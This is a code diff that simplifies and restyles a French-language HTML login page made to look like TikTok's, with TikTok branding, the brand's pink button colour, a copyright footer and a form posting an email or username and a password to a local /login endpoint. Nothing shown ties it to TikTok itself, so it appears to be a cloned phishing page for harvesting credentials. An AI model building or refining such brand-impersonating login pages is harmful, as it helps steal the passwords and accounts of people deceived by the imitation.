@@ -5,27 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion | TikTok</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: black; color: #fff; display: flex; flex-direction: column; justify-content: space-between; align-items: center; height: 100vh; margin: 0; }
-        .header { width: 100%; padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
-        .logo-container { display: flex; align-items: center; text-decoration: none; color: #fff; }
-        .logo-text { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; margin-left: 10px; }
-        .login-container { width: 100%; max-width: 480px; padding: 20px; box-sizing: border-box; margin-top: -10vh; }
-        h2 { text-align: center; font-size: 32px; margin-bottom: 30px; font-weight: 700; }
-        .input-group { margin-bottom: 15px; position: relative; }
-        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #333; border-radius: 4px; font-size: 16px; box-sizing: border-box; background-color: #222; color: #fff; }
-        .login-btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        body { font-family: sans-serif; background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-card { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+        .logo { margin-bottom: 20px; font-size: 30px; font-weight: bold; }
+        .input-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #333; background: #222; color: #fff; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .footer { margin-top: 20px; color: #888; font-size: 12px; }
     </style>
 </head>
 <body>
-<div class="header">
-    <div class="logo-container">
-        <img src="tiktok.png" width="32" alt="logo_tiktok"/>
-        <div class="logo-text">TikTok</div>
-    </div>
-</div>
 
-<div class="login-container">
+<div class="login-card">
+    <div class="logo">TikTok</div>
     <h2>Connexion</h2>
+    
     <form action="/login" method="POST">
         <div class="input-group">
             <input type="text" name="username" placeholder="E-mail ou nom d'utilisateur" required>
@@ -33,8 +27,11 @@
         <div class="input-group">
             <input type="password" name="password" placeholder="Mot de passe" required>
         </div>
-        <button type="submit" class="login-btn">Se connecter</button>
+        <button type="submit" class="btn">Se connecter</button>
     </form>
 </div>
+
+<div class="footer">© 2026 TikTok</div>
+
 </body>
 </html>
